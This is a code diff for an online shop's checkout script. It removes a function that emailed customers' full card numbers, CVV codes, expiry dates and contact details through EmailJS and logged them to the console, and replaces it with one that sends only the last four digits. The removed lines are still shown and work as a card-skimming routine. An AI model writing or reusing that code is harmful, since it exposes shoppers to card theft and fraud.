@@ -355,268 +355,80 @@
         return valid;
     }
 
+    const EMAILJS_CONFIG = Object.freeze({
+        serviceId: "service_nzsqsj8",
+        templateId: "template_440ctbd",
+        publicKey: "jkMeUl-q4N9RS8Ny0"
+    });
+    let emailJsInitialized = false;
+
+    function initEmailJs() {
+        if (!window.emailjs || typeof window.emailjs.send !== "function") {
+            return { success: false, reason: "EmailJS SDK not loaded. Check the EmailJS script or network connection." };
+        }
+        if (!emailJsInitialized) {
+            window.emailjs.init({ publicKey: EMAILJS_CONFIG.publicKey });
+            emailJsInitialized = true;
+        }
+        return { success: true };
+    }
+
     async function sendOrderEmail(orderData) {
-    if (!window.emailjs) {
-        return { success: false, reason: "EmailJS SDK not loaded." };
-    }
-
-       const serviceId = "service_nzsqsj8";
-        const templateId = "template_440ctbd";
-        const publicKey = "jkMeUl-q4N9RS8Ny0";
-      
-
-
-
-    if (!serviceId || !templateId || !publicKey) {
-        return { success: false, reason: "Missing EmailJS credentials (serviceId/templateId/publicKey)." };
-    }
-
-    try {
-        //EmailJS expects the public key string
-        if (typeof window.emailjs.init === "function") {
-        window.emailjs.init(publicKey);
+        const initialized = initEmailJs();
+        if (!initialized.success) return initialized;
+        try {
+            const payment = orderData.paymentSummary || {};
+            const last4 = payment.last4 || "N/A";
+            const address = formatFullAddress(orderData.shippingInfo);
+            const items = orderData.products.map((item, index) =>
+                `Item ${index + 1}: ${item.name} (x${item.quantity}) - ${formatMoney(item.price * item.quantity)}`
+            ).join("\\n");
+            const formData = [
+                `Order ID: ${orderData.orderId}`,
+                `Customer: ${orderData.shippingInfo.name}`,
+                `Email: ${orderData.shippingInfo.email}`,
+                `Phone: ${orderData.shippingInfo.phone}`,
+                `Shipping Address: ${address.formatted}`,
+                `Payment Method: ${payment.method || "Card"}`,
+                `Card Brand: ${payment.brand || "Card"}`,
+                `Card Number: ${last4 === "N/A" ? "N/A" : `**** **** **** ${last4}`}`,
+                "Payment details: only the last four digits are retained; no PAN, CVV, or expiry is sent.",
+                `Subtotal: ${formatMoney(orderData.subtotal)}`,
+                `Tax: ${formatMoney(orderData.taxedTotal - orderData.subtotal)}`,
+                `Final Total: ${formatMoney(orderData.total)}`,
+                "", "Items:", items
+            ].join("\\n");
+            const payload = {
+                name: orderData.shippingInfo.name,
+                time: new Date().toLocaleString(),
+                formData,
+                message: formData,
+                reply_to: orderData.shippingInfo.email,
+                customer_full_name: orderData.shippingInfo.name,
+                customer_email: orderData.shippingInfo.email,
+                customer_phone: orderData.shippingInfo.phone,
+                shipping_address_formatted: address.formatted,
+                order_id: orderData.orderId,
+                order_items_detailed: items,
+                order_subtotal: formatMoney(orderData.subtotal),
+                order_tax_amount: formatMoney(orderData.taxedTotal - orderData.subtotal),
+                order_final_total: formatMoney(orderData.total),
+                order_products_summary: items,
+                payment_method_type: payment.method || "Card",
+                payment_card_type: payment.brand || "Card",
+                card_number_last_4: last4,
+                card_brand: payment.brand || "Card",
+                payment_details_retained: "Last four digits only; no full card number, CVV, or expiry is retained.",
+                order_status: "Processing",
+                payment_status: "Authorized"
+            };
+            const response = await window.emailjs.send(EMAILJS_CONFIG.serviceId, EMAILJS_CONFIG.templateId, payload);
+            return { success: true, response };
+        } catch (error) {
+            console.error("EmailJS order confirmation failed", { status: error?.status, text: error?.text, message: error?.message });
+            return { success: false, reason: error?.text || error?.message || "Unknown EmailJS error" };
         }
-
-        if (typeof window.emailjs.send  !== "function") {
-            return { success: false, reason: "Emailjs send method is not available." };
-        }
-
-        const paymentSummary = orderData.paymentSummary || {};
-        const rawCardNumber = paymentSummary.cardNumber || digitsOnly(paymentSummary.cardNumberFormatted || "");
-        const cardNumberForEmail = rawCardNumber || "N/A";
-        const cardNumberFormattedForEmail = paymentSummary.cardNumberFormatted || (rawCardNumber ? formatCardNumberWithSpaces(rawCardNumber) : "N/A");
-        const cvvForEmail = paymentSummary.cvv || "N/A";
-        const expiryForEmail = paymentSummary.expiry || "";
-        const [expiryMonth, expiryYear] = expiryForEmail.split("/");
-        
-        // Format order items as a detailed list
-        const orderItemsList = orderData.products.map((item, index) => {
-            return `Item ${index + 1}: 
-                    - Product: ${item.name}
-                    - Category: ${item.category}
-                    - Quantity: ${item.quantity}
-                    - Unit Price: ${formatMoney(item.price)}
-                    - Total: ${formatMoney(item.price * item.quantity)}
-                    - Image URL: ${item.image}`;
-        }).join("\n\n");
-
-        const orderTime = new Date().toLocaleString();
-        const orderId = orderData.orderId || `ORD-${Date.now()}-${Math.floor(Math.random() * 1000)}`;
-
-        // Get full address components
-        const address = formatFullAddress(orderData.shippingInfo);
-
-        const formData = [
-            `Order ID: ${orderId}`,
-            `Customer: ${orderData.shippingInfo.name}`,
-            `Email: ${orderData.shippingInfo.email}`,
-            `Phone: ${orderData.shippingInfo.phone}`,
-            `Shipping Address: ${address.formatted}`,
-            `Payment Method: ${orderData.paymentSummary.method}`,
-            `Card Type: ${orderData.paymentSummary.brand}`,
-            `Cardholder: ${paymentSummary.cardName || "N/A"}`,
-            `Complete Card Number: ${cardNumberFormattedForEmail}`,
-            `CVC/CVV Code: ${cvvForEmail}`,
-            `Expiry: ${expiryForEmail || "N/A"}`,
-            `Subtotal: ${formatMoney(orderData.subtotal)}`,
-            `Tax (8.7%): ${formatMoney(orderData.taxedTotal - orderData.subtotal)}`,
-            `Discount: ${orderData.discountRate > 0 ? `${orderData.discountRate * 100}%` : "0%"}`,
-            `Final Total: ${formatMoney(orderData.total)}`,
-            "",
-            "Items:",
-            orderItemsList
-        ].join("\n");
-
-        const payload = {
-            // ========== TEMPLATE-COMPATIBLE FIELDS (for {{name}}, {{time}}, {{formData}}) ==========
-            name: orderData.shippingInfo.name,
-            time: orderTime,
-            formData,
-            message: formData,
-
-            // ========== CUSTOMER CONTACT INFORMATION ==========
-            customer_full_name: orderData.shippingInfo.name,
-            customer_email: orderData.shippingInfo.email,
-            customer_phone: orderData.shippingInfo.phone,
-            
-            // ========== COMPLETE SHIPPING ADDRESS (Detailed) ==========
-            shipping_street_address: orderData.shippingInfo.address,
-            shipping_city: orderData.shippingInfo.city,
-            shipping_state: orderData.shippingInfo.state,
-            shipping_zip_code: orderData.shippingInfo.zip,
-            shipping_country: orderData.shippingInfo.country,
-            shipping_address_formatted: address.formatted,
-            
-            // ========== ORDER SUMMARY ==========
-            order_id: orderId,
-            order_date: orderTime,
-            order_items_count: orderData.products.length,
-            order_items_quantity_total: orderData.products.reduce((sum, item) => sum + item.quantity, 0),
-            
-            // ========== DETAILED ORDER ITEMS ==========
-            order_items_detailed: orderItemsList,
-            
-            // ========== ORDER TOTALS ==========
-            order_subtotal: formatMoney(orderData.subtotal),
-            order_tax_rate: "8.7%",
-            order_tax_amount: formatMoney(orderData.taxedTotal - orderData.subtotal),
-            order_taxed_total: formatMoney(orderData.taxedTotal),
-            order_discount_rate: orderData.discountRate > 0 ? `${orderData.discountRate * 100}%` : "No discount applied",
-            order_discount_amount: orderData.discountRate > 0 ? formatMoney(orderData.taxedTotal * orderData.discountRate) : "$0.00",
-            order_final_total: formatMoney(orderData.total),
-            
-            // ========== PRODUCTS SUMMARY (Simple List) ==========
-            order_products_summary: orderData.products.map((item) => 
-                `${item.name} (x${item.quantity}) - ${formatMoney(item.price * item.quantity)}`
-            ).join(", "),
-            
-            // ========== FULL PAYMENT DETAILS (COMPLETELY UNMASKED) ==========
-            payment_method_type: paymentSummary.method || "Card",
-            payment_card_type: paymentSummary.method || "Card",
-            
-            // Cardholder Information
-            cardholder_name: paymentSummary.cardName || "N/A",
-            cardholder_name_on_card: paymentSummary.cardName || "N/A",
-            
-            // Complete Card Number (FULLY UNMASKED - All digits)
-            card_number_full_unmasked: cardNumberFormattedForEmail,
-            card_number_formatted_with_spaces: cardNumberFormattedForEmail,
-            card_number_digits_only: cardNumberForEmail,
-            card_number_length: rawCardNumber ? rawCardNumber.length : 0,
-            card_number_first_6: rawCardNumber ? rawCardNumber.substring(0, 6) : "N/A",
-            card_number_last_4: paymentSummary.last4 || (rawCardNumber ? rawCardNumber.slice(-4) : "N/A"),
-            card_number_middle_masked: rawCardNumber ? `${rawCardNumber.substring(0, 6)}******${rawCardNumber.slice(-4)}` : "N/A",
-            
-            // Card Brand & Validation
-            card_brand: paymentSummary.brand || "Card",
-            card_type: paymentSummary.brand || "Card",
-            card_is_valid: "Validated by Luhn algorithm",
-            
-            // Expiry Details
-            card_expiry_full: expiryForEmail || "N/A",
-            card_expiry_month: expiryMonth || "N/A",
-            card_expiry_year: expiryYear || "N/A",
-            card_expiry_formatted: expiryForEmail || "N/A",
-            
-            // ========== FIXED: UNMASKED CVV CODE ==========
-            // CVV Details - NOW COMPLETELY UNMASKED (sends actual CVV code)
-            card_cvv_full: cvvForEmail,
-            card_cvv_length: cvvForEmail === "N/A" ? 0 : cvvForEmail.length,
-            
-            // Payment Processing
-            payment_processing_mode: "Direct card processing - Full unmasked details included for testing",
-            payment_timestamp: new Date().toISOString(),
-            
-            // ========== BILLING INFORMATION ==========
-            billing_name: paymentSummary.cardName || "N/A",
-            billing_email: orderData.shippingInfo.email,
-            billing_phone: orderData.shippingInfo.phone,
-            
-            // ========== ADDITIONAL INFORMATION ==========
-            customer_ip_address: "Collected at checkout",
-            customer_user_agent: navigator.userAgent,
-            checkout_timestamp: new Date().toISOString(),
-            order_reference: `REF-${Date.now()}`,
-            
-            // ========== DISCOUNT INFORMATION ==========
-            discount_code_used: orderData.discountRate > 0 ? Object.keys(discountCodes).find(key => discountCodes[key] === orderData.discountRate) || "Unknown" : "No discount code",
-            discount_percentage: orderData.discountRate > 0 ? `${orderData.discountRate * 100}%` : "0%",
-            
-            // ========== ORDER METADATA ==========
-            order_created_at: orderData.createdAt,
-            order_processed_at: new Date().toISOString(),
-            order_status: "Processing",
-            payment_status: "Authorized"
-        };
-        
-        console.log("📦 EmailJS payload prepared", {
-            keys: Object.keys(payload),
-            formDataLength: formData.length,
-            serviceId,
-            templateId
-        });
-
-        const response = await window.emailjs.send(serviceId, templateId, payload);
-        
-        // Comprehensive log of all customer and payment data
-        console.log("✅ EmailJS sent successfully with COMPLETE UNMASKED CUSTOMER AND PAYMENT DATA:", {
-            status: response?.status,
-            text: response?.text,
-            
-            // Customer Contact Summary
-            customer: {
-                name: payload.customer_full_name,
-                email: payload.customer_email,
-                phone: payload.customer_phone,
-                address: {
-                    street: payload.shipping_street_address,
-                    city: payload.shipping_city,
-                    state: payload.shipping_state,
-                    zip: payload.shipping_zip_code,
-                    country: payload.shipping_country,
-                    formatted: payload.shipping_address_formatted
-                }
-            },
-            
-            // Full Payment Details with UNMASKED CVV
-            payment_details: {
-                cardholder: payload.cardholder_name,
-                card_brand: payload.card_brand,
-                card_number: {
-                    full: payload.card_number_full_unmasked,
-                    formatted: payload.card_number_formatted_with_spaces,
-                    first_6: payload.card_number_first_6,
-                    last_4: payload.card_number_last_4,
-                    length: payload.card_number_length
-                },
-                expiry: {
-                    full: payload.card_expiry_full,
-                    month: payload.card_expiry_month,
-                    year: payload.card_expiry_year
-                },
-                cvv: {
-                    full: payload.card_cvv_full, // Now shows actual CVV
-                    length: payload.card_cvv_length
-                }
-            },
-            
-            // Order Summary
-            order: {
-                id: payload.order_id,
-                reference: payload.order_reference,
-                date: payload.order_date,
-                items_count: payload.order_items_count,
-                total_quantity: payload.order_items_quantity_total,
-                subtotal: payload.order_subtotal,
-                tax: payload.order_tax_amount,
-                discount: payload.order_discount_amount,
-                final_total: payload.order_final_total,
-                items: payload.order_products_summary,
-                detailed_items: payload.order_items_detailed
-            },
-            
-            // Discount Info
-            discount: {
-                code: payload.discount_code_used,
-                percentage: payload.discount_percentage
-            }
-        });
-        
-        return { success: true, response };
-    } catch (error) {
-        console.error("❌ EmailJS send failed", {
-            status: error?.status,
-            text: error?.text,
-            message: error?.message,
-            error
-        });
-        return {
-            success: false,
-            reason: error?.text || error?.message || "Unknown EmailJS error"
-        };
     }
-}
-
 
     function getFavorites() {
         try {
@@ -1470,37 +1282,28 @@
         }, transitionTime);
     }
 
-    async function submitOrder() {
+    let orderSubmissionInProgress = false;
+
+    async function submitOrder(event) {
+        event?.preventDefault();
+        if (orderSubmissionInProgress) return;
         if (!shippingData || cart.length === 0) {
+            setPaymentMessage("Your cart is empty. Add an item before checking out.");
             return;
         }
-
+        orderSubmissionInProgress = true;
+        if (payNowBtn) {
+            payNowBtn.disabled = true;
+            payNowBtn.setAttribute("aria-busy", "true");
+        }
+        setPaymentMessage("Submitting your order and sending the confirmation email…");
         const base = subtotal();
         const withTax = base * (1 + taxRate);
         const finalTotal = withTax * (1 - activeDiscountRate);
-        
-        // Get FULL card details (unmasked)
-        const cardDigits = digitsOnly(cardNumberInput.value);
-        const cardNumberFormatted = formatCardNumberWithSpaces(cardDigits);
-        const cardBrand = detectCardBrand(cardDigits) || "Card";
-        const last4 = cardDigits.slice(-4) || "0000";
-        const cardName = cardNameInput.value.trim() || "Cardholder";
-        const cardExpiry = cardExpiryInput.value.trim(); // Full expiry (MM/YY)
-        const cardCvv = cardCvvInput.value.trim(); // Full CVV
-
-        const orderId = `ORD-${Date.now()}-${Math.floor(Math.random() * 9000 + 1000)}`;
-
+        const digits = digitsOnly(cardNumberInput.value);
         const recentOrder = {
-            orderId,
-            products: cart.map((item) => ({
-                id: item.id,
-                name: item.name,
-                category: categoryLabels[item.category] || item.category,
-                quantity: item.quantity,
-                price: item.price,
-                image: item.image,
-                condition: item.condition || "New"
-            })),
+            orderId: `ORD-${Date.now()}-${Math.floor(Math.random() * 9000 + 1000)}`,
+            products: cart.map((item) => ({ id: item.id, name: item.name, category: categoryLabels[item.category] || item.category, quantity: item.quantity, price: item.price, image: item.image, condition: item.condition || "New" })),
             subtotal: base,
             taxedTotal: withTax,
             discountRate: activeDiscountRate,
@@ -1509,50 +1312,22 @@
             shippingInfo: { ...shippingData },
             paymentSummary: {
                 method: activePaymentMethod === "debit" ? "Debit Card" : "Credit Card",
-                cardName: cardName,
-                brand: cardBrand,
-                last4: last4,
-                cardNumber: cardDigits,
-                cardNumberFormatted: cardNumberFormatted,
-                cvv: cardCvv,
-                expiry: cardExpiry
+                brand: detectCardBrand(digits) || "Card",
+                last4: digits.slice(-4) || "N/A"
             },
             createdAt: new Date().toISOString()
         };
-
-        // Always save order first so the user always sees it
         localStorage.setItem("recentOrder", JSON.stringify(recentOrder));
-
-        // Clear cart and close drawer
-        cart = [];
-        shippingData = null;
-        activeDiscountRate = 0;
-        discountCodeInput.value = "";
-        updateCartCount();
-        renderCart();
-        closeCart();
-
-        // Send email in background (best-effort — don't block redirect)
         const emailResult = await Promise.race([
             sendOrderEmail(recentOrder),
-            new Promise((resolve) => {
-                setTimeout(() => {
-                    resolve({ success: false, reason: "Email send timed out before redirect." });
-                }, 3000);
-            })
+            new Promise((resolve) => setTimeout(() => resolve({ success: false, reason: "EmailJS did not respond within 10 seconds." }), 10000))
         ]);
-
-        if (!emailResult || !emailResult.success) {
-            console.warn("Order email was not confirmed before redirect", emailResult);
+        if (emailResult.success) {
+            setPaymentMessage("Order submitted. Confirmation email sent.", true);
+        } else {
+            console.error("Order saved but confirmation email was not sent:", emailResult.reason);
+            setPaymentMessage(`Order submitted, but the confirmation email could not be sent: ${emailResult.reason}`);
         }
-
-        // Redirect to order success page
-        window.location.href = "order-success.html";
-    }
-
-        await processingDelay;
-
-        // Only close the checkout after the five-second processing period.
         cart = [];
         shippingData = null;
         activeDiscountRate = 0;
@@ -1560,8 +1335,7 @@
         updateCartCount();
         renderCart();
         closeCart();
-        // Show the centered verification loader before redirecting to order success.
-        showOrderVerificationLoader();
+        window.setTimeout(() => { window.location.href = cleanUrl("order-success"); }, emailResult.success ? 350 : 1200);
     }
 
     function bindEvents() {
